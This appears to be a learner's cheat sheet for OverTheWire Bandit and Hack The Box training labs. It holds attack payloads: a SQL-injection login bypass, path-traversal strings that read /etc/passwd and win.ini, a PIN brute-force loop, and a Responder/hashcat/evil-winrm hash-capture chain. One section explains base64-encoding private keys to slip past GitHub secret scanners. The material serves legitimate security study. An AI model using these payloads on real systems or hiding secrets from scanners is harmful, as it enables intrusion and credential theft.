# Bandit Hackers Cheat Sheet
## How to access bandit servers
- Run this `ssh bandit25@bandit.labs.overthewire.org -p 2220`
## Compression
- Gzip: `gunzip` (needs .gz extension)
- Bzip2: `bzip2 -d` (needs .bz2 extension)
- Tar: `tar -xf` (extract file)

## SSH Keys
- Permissions: `chmod 600 key_file`
- Usage: `ssh -i key_file user@host -p port`

## Networking
- Netcat: `nc localhost [port]`
- Send string: `echo "data" | nc localhost [port]`

## SSL/TLS Networking (Level 15+)
- Connect to encrypted port: `openssl s_client -connect localhost:[port]`
- Note: After connecting, paste the current password and hit Enter.

## Port Scanning (Level 16)
- Find open ports in a range: `nmap -p 31000-32000 localhost`
- Check service type (SSL/Plain): `nmap -sV -p 31000-32000 localhost`

## Service Identification (Level 16)
- Check version/service of ports: `nmap -sV -p [port1,port2] localhost`
- Look for the SSL service that doesn't just "echo" your input.

## Deep Dive: Nmap
- `nmap -p [range]`: Scans for open "doors" (Basic SYN scan).
- `nmap -sV -p [ports]`: Interrogates the service to see WHAT is running (Service Versioning).
- Port State "Open": A program is listening and ready to talk.

## Level 16 Discovery
- Winning Port: 31790 (ssl/unknown)
- Why: It's the only SSL port that isn't a simple echo service.

## Service Analysis (Level 16 Recap)
- `ssl/echo`: Encrypted but useless (just repeats what you say).
- `ssl/unknown`: The target. It actively processes input and returns unique data (like the RSA key).
- Key Discovery: Port 31790 was the winner.

## Troubleshooting Input (Level 16)
- Invisible characters: Some services fail if there is a trailing newline.
- Use `echo -n "STRING"` to send the raw string without a newline.

## Key-Based Authentication (Level 17)
- Use a private key to login: `ssh -i [path_to_key] user@host -p [port]`
- Critical Step: Key must have strict permissions (`chmod 600 [file]`) or SSH will reject it.

## Secret Stealth: Base64 Encoding
- Disguise a key for GitHub: `base64 [file] > [file].b64`
- Restore the key: `base64 -d [file].b64 > [file]`
- Why: GitHub scanners look for PEM headers; Base64 hides them.

## File Comparison (Level 17)
- Find differences between two files: `diff file1 file2`
- `<` means the line is only in the first file.
- `>` means the line is only in the second file (the new password).

## OverTheWire Rules
- SSH from localhost is blocked: Always SSH from your local machine (Fedora) to reach the next level.

## Remote Command execution (Level 18 Bypass)
- Read a file without a stable shell: `ssh user@host -p [port] "cat [filename]"`

## SetUID Binaries (Level 19)
- **Identification**: Look for the `s` in permissions (e.g., `-rwsr-x---`).
- **Mechanism**: The program runs with the **Effective UID** (authority) of the owner, not the person running it.
- **Example**: `./bandit20-do [command]` lets you act as Bandit 20.

## SetUID Execution (Level 19)
- **Command**: `./bandit20-do [cmd]`
- **Power**: Executes the command as the owner (bandit20).
- **Goal**: Read `/etc/bandit_pass/bandit20`.

## Cron Jobs (Automation)
- **Location**: `/etc/cron.d/`
- **Goal**: Find scripts that run automatically and see where they save data.
- **Tactic**: Read the `.sh` script to find the `/tmp/` file path where the password is hidden.

## Hashed Filenames (Level 22 Recap)
- **Concept**: Using a script to generate a dynamic filename based on a string.
- **Tactic**: Reproduce the script's logic (`echo string | md5sum`) to find the hidden path.
- **Note**: Ensure the "salt" (like 'I am user') matches the script exactly.

## Network Brute-Forcing (Level 24 Recap)
- **Problem**: PIN (0000-9999).
- **The Script**:
```bash
for pin in {0000..9999}; do
  echo "[PASS] $pin"
done | nc localhost 30002
```

## SUID Binaries (Level 26 Recap)
- **Concept**: A file (like bandit27-do) that runs with the permissions of its owner, not the person running it.
- **Tactic**: Use the binary to execute commands (like 'cat') on files your current user normally can't see.
- **Example**: \`./bandit27-do cat /etc/bandit_pass/bandit27\`

# Switched to Hack The Box!
## 🔍 Phase 1: Recon (Finding the Door)
| Command | What it does |
| :--- | :--- |
| `ping -c 4 [IP]` | Checks if the server is alive. |
| `nmap -sV [IP]` | Scans for services (Telnet, SSH, FTP). |
| `nmap -A [IP]` | Aggressive scan (OS and version details). |

## 🔓 Phase 2: Entry (Picking the Lock)
| Command | What it does |
| :--- | :--- |
| `telnet [IP]` | Connect to old login services (Try user: `root`). |
| `ftp [IP]` | File Transfer (Try user: `anonymous`, no password). |
| `ssh [user]@[IP]` | Secure login (The professional standard). |

## 🚩 Phase 3: Post-Exploitation (Looting)
| Command | What it does |
| :--- | :--- |
| `whoami` | Confirms if you are `root`. |
| `ls -la` | Shows all files, including hidden ones. |
| `cat flag.txt` | Reads the proof of capture. |
| `get [file]` | (FTP Only) Downloads a file to your machine. |
| `find / -name "*.txt" 2>/dev/null` | Deep search for passwords/flags. |

## 🌐 Network Fixes
* **No route to host?** Run `sudo openvpn [file].ovpn` in a separate tab.
* **Using Pwnbox?** Use the terminal inside the browser window.
## [FTP] File Transfer Protocol - Port 21
- **Scan:** `nmap -p 21 [IP]`
- **Access:** `ftp [IP]`
- **Common Credentials:** `anonymous` : `anonymous` or blank password.
- **Commands:**
  - `ls` : List files
  - `get [file]` : Download file to your machine
  - `put [file]` : Upload file to server
  - `exit` or `bye` : Disconnect


## [SMB] Server Message Block - Port 445
- **Scan:** `nmap -p 445 [IP]`
- **List Shares:** `smbclient -L [IP] -N`
- **Connect:** `smbclient //[IP]/[ShareName] -N`
- **Commands:**
  - `ls` : List content
  - `cd` : Change directory
  - `get` : Download file
  - `exit` : Close connection



---
## 🛠️ REDEEMER & REDIS TECHNICAL LOGIC (Updated 2026-03-25)

### The "Filtered" Port Problem
- **Status: Filtered** = The firewall is dropping your packets. 
- **The Fix:** Ensure you are on the **Starting Point** VPN, not the "Main Lab" VPN. 
- **The MTU Fix:** If the connection is still "choppy" from Casablanca, use `sudo ifconfig tun0 mtu 1200`.

### Service Enumeration (The "What")
- **Command:** `nmap -p 6379 -sV [IP]`
- **-sV Flag:** This is the most important flag for the "Version" question in HTB. It forces the service to identify itself (e.g., Redis 5.0.7).

### Tooling
- **Utility Name:** `redis-cli` (or `valkey-cli` on Fedora).
- **Default Port:** `6379`
- **Protocol:** `TCP` (Connection-oriented, unlike UDP).

---
## 💉 SQL INJECTION (SQLi) - THE BASICS
- **Concept:** Using database syntax to bypass login forms.
- **The "Universal Password":** ' OR 1=1 -- -
- **The Breakdown:**
  - `'` (Single Quote): Closes the current data field.
  - `OR 1=1`: A statement that is ALWAYS true.
  - `-- `: Tells the database to "ignore" (comment out) the rest of the query (like the real password check).

---
## 🗄️ DATABASE COMPARISON (REDIS VS. SQL)

### 1. Redis (NoSQL / Key-Value)
- **Structure:** Like a pile of boxes with labels.
- **Navigation:** 'SELECT [index]', 'KEYS *', 'GET [key]'.
- **Usage:** Fast, temporary data (caching).

### 2. SQL (Relational / Tables)
- **Structure:** Like an Excel Spreadsheet with Rows and Columns.
- **Navigation:** 'SELECT * FROM [Table] WHERE [Condition]'.
- **Usage:** Permanent data (User accounts, profiles, logs).
- **Vulnerability:** SQL Injection (SQLi).

---
## 🏆 HTB SQL VULNERABILITY Q&A
- **Q: What does SQL stand for?**
  - **A:** Structured Query Language.
- **Q: What is the most common vulnerability related to SQL?**
  - **A:** SQL Injection (SQLi).
- **Q: What character is used to "break" an SQL query string?**
  - **A:** The single quote (').
- **Q: What is the purpose of "--" in an SQLi payload?**
  - **A:** It is a comment-out character (ignores the rest of the original query).
- **Q: What is the most common "universal" login bypass?**
  - **A:** ' OR 1=1 -- -

---
## 🌐 COMMON WEB PORTS
- **80:** HTTP (Unencrypted web traffic)
- **443:** HTTPS (Encrypted web traffic - uses SSL/TLS)
- **8080:** HTTP Proxy / Alternative (Often used for development or Burp Suite)

---
## 📁 WEB TERMINOLOGY
- **Directory:** The web equivalent of a "folder".
- **Root Directory:** The main folder where the website starts (usually `/` or `/var/www/html`).
- **Sub-directory:** A folder inside another folder (e.g., `http://[IP]/images/`).
- **Directory Enumeration:** The process of finding hidden folders using a wordlist (brute-forcing).

---
## 🚩 COMMON TERMINAL FLAGS
- **-u [name]:** User (Who are you?)
- **-p [pass]:** Password (What is your key?)
- **-h [ip]:** Host (Where are you going?)
- **-P [port]:** Port (Which door are you using?)
- **-v:** Verbose (Tell me everything that is happening!)

---
## 🚩 THE BIG THREE FLAGS
- **-h** = Host (The Target IP)
- **-u** = User (The Username)
- **-p** = Password (The Key)

---
## 🔄 TERMINAL VS. SQL TRANSLATION
- **Linux:** `ls` (List files)  ->  **SQL:** `SHOW DATABASES;` then `SHOW TABLES;`
- **Linux:** `cd` (Enter folder) ->  **SQL:** `USE [database_name];`
- **Linux:** `cat` (Read file)  ->  **SQL:** `SELECT * FROM [table_name];`

---
## ⚠️ SQL SYNTAX REMINDER
- **Flags (like -A, -u):** Only work in the BASH terminal when starting the program.
- **SQL Commands (inside mysql>):** Do NOT use flags. Just use 'COMMAND [target];'.
- **The Semi-colon (;):** If the prompt changes to '->', it means you forgot the ; at the end of your previous line!

---
## 🗣️ MYSQL STATUS MESSAGES
- **Database changed:** Success! You are now inside the database you selected.
- **Empty set:** The command worked, but there is literally nothing inside that table/database.
- **Rows in set:** Success! It found data and is showing it to you.
- **Query OK:** Your command (like deleting or updating) worked perfectly.

---
## 🚪 LEAVING THE DATABASE
- **exit** or **quit**: Safely disconnects you from the MySQL server and returns you to your Fedora terminal (Bash).
- **Ctrl+D**: The universal "End of File/Input" shortcut that also works to exit most database prompts.

---
## 📝 WRITING TO FILES (HEREDOC)
- **cat << 'EOF' >> [file]:** Best way to paste long blocks of text into a file.
- **>>:** Append (Add to the end).
- **>:** Overwrite (Delete and start over).

---
## 👓 QUICK FILE VIEWING
- **tail -n [number] [file]:** See the LAST few lines (Great for logs).
- **head -n [number] [file]:** See the FIRST few lines.
- **less [file]:** Opens the file in a way you can scroll up and down (Press 'q' to quit).

---
## ⚡ FAST RECON (IMPATIENT MODE)
- **nmap -F -T4 [IP]:** Scans the top 100 ports very quickly.
- **nmap --top-ports 20 [IP]:** Just the essentials.
- **nmap -p 21,22,80,443,3306 [IP]:** Scan ONLY the ports we actually care about.

---
## 🧊 WHEN NMAP FREEZES (0.00% DONE)
- **Problem:** Service scanning (-sV) is hanging on a slow response.
- **Solution:** Use '-Pn' to skip host discovery, or remove '-sV' and just check the port.
- **The "Skip the Version" Scan:** nmap -p [port] [IP]

---
## 🎯 PRECISION VERSION SCANNING
- **nmap -sV --version-light [IP]:** Only tries the most common version probes.
- **nmap -sV --version-all [IP]:** The "Deep Dive" (Slowest, but most accurate).
- **--max-retries [num]:** Prevents Nmap from getting stuck on a "ghost" port.

---
## 🛠️ NETWORK TROUBLESHOOTING (HTB)
- **ping [IP]:** Check for latency/packet loss.
- **sudo ip link set dev tun0 mtu 1200:** Shrink packet size (fixes some VPN lag).
- **Reset Machine (Web UI):** The "Have you tried turning it off and on again?" for HTB.

---
## 👻 GHOST SERVICE DIAGNOSIS
- **Ping < 100ms + 0% Loss:** The Network is FINE.
- **Nmap Hangs @ 0.00%:** The Target Service (MySQL/MariaDB) is FROZEN or OVERLOADED.
- **The Fix:** Restart the Target Machine on the HTB Web Dashboard.

---
## 🤝 THE MANUAL HANDSHAKE
- **mysql -h [IP] -u root:** Try to log in directly to see the version string.
- **Why?** Bypasses Nmap's complex probes that might be getting filtered or hung.

---
## 🏷️ HTB QUESTION TIPS
- **Variant:** Usually looking for a name (e.g., MariaDB, Apache, vsftpd).
- **Version:** Usually looking for just the numbers (e.g., 10.3.27).
- **Service:** Usually looking for the protocol (e.g., mysql, ftp, ssh).

---
## 📊 SQL WILDCARDS
- ** * (Asterisk):** Represents "Everything" or "All columns".
- **Example:** SELECT * FROM users; (Shows every detail for every user).

---
## Note
- To do agressive scan run:
- `nmap -p- --min-rate 5000 [IP addr.]`

---
## 🐊 CROCODILE LESSONS
- **FTP Anonymous:** Always check Port 21 for 'anonymous' login.
- **Hidden Doors:** If the website has no login, use Gobuster + common.txt.
- **Extensions:** Use '-x php,html,txt' to find specific file types.
- **Flag Location:** Usually behind an admin panel or a hidden directory.
- **To check for files inside the website, run:** gobuster dir -u http://[IP] -w ~/Programs/Hack/.Wordlists/common.txt -x php,html

---
## 📄 LFI (LOCAL FILE INCLUSION)
- **Concept:** Exploiting a web parameter to read system files.
- **Windows Test:** /index.php?view=../../../../windows/win.ini
- **Linux Test:** /index.php?view=../../../../etc/passwd
- **Common Params:** view, page, file, lang, path

---
## 🧗 DIRECTORY TRAVERSAL (LFI)
- **Windows Goal:** Read C:\Windows\win.ini
- **Payload:** index.php?page=../../../../../../../../windows/win.ini
- **Why many ../?** It ensures you reach the root (C:\) even if the web folder is buried deep.

---
## 🌐 COMMON NETWORK FLAGS
- **-i / -I [interface]:** Specifies which network card to use (e.g., -I tun0).
- **tun0:** The virtual interface created by OpenVPN for Hack The Box.
- **eth0 / wlan0:** Physical Ethernet or Wi-Fi interfaces.

## 🛠️ SESSION COMMANDS SUMMARY
* **Capture:** sudo responder -I wlan0 -rdwv "Shouting version" | sudo responder -I wlan0 -rv "Stealthy version"
* **Crack:** hashcat -m 5600 hash.txt .Wordlists/rockyou.txt
* **Access:** evil-winrm -i [IP] -u Administrator -p [PASSWORD]
* **Search Flags:** Get-ChildItem -Path C:\ -Include *flag* -File -Recurse -ErrorAction SilentlyContinue
* **Read Flag:** type C:\Users\Administrator\Desktop\flag.txt
